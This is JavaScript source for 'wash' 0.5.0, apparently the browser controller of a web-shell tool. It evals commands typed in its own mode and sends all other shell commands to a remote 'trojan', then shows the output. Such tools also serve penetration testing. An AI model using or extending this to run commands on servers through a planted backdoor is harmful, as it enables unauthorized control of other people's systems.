// this is the top-level application object
var wash = {

    // store the version number (sometimes this is handy)
    version: '0.5.0',

    // processes commands on the wash prompt
    process: function(command){
        // parse out the wash action
        if(shell.prompt.mode.get() == 'wash'){
            // Process wash commands as pure JavaScript. This allows for
            // tremendous extensibility
            try{
                eval(command);
            }catch(e){
                shell.output.write('wash error: Invalid command.', 'output wash_error');
            }
        }
        
        // if the prompt is not in wash mode, default to shell action
        else {
            // parse out a handle to use for command post-processing
            var space_pos = command.indexOf(' ');
            if(space_pos === -1){ var command_root = command; }
            else { var command_root = command.substr(0, space_pos); }

            // listen for re-mapped commands
            // @see: extensions/wash.remap.js
            if(wash.remap[command_root] != null){
                // execute the JavaScript callback function
                wash.remap[command_root].callback(command);
                // remap the command
                command = wash.remap[command_root].command;
                // if the command was remapped to boolean false, terminate.
                // Nothing needs to be done beyond firing the JavaScript
                // payload.
                if(command === false){
                    shell.prompt.context.set(wash.response.prompt_context);
                    shell.prompt.draw();
                    return false;
                }
            }

            // communicate with the trojan
            wash.command.action = 'shell';
            wash.command.cmd    = command;
            wash.net.send(function(){  
                // display the output
                shell.prompt.context.set(wash.response.prompt_context);
                shell.prompt.draw();

                // do post-processing on the command output, if appropriate
                /*
                if(wash.post_processor[command_root] != null){
                    wash.post_processor[command_root]();
                }
                */

                // display output or error, depending on which was received
                if(wash.response.error != null){ shell.output.write(wash.response.error, 'output wash_error'); }
                else { shell.output.write(wash.response.output, 'output ' + command_root); }
            });
        }
    },
}
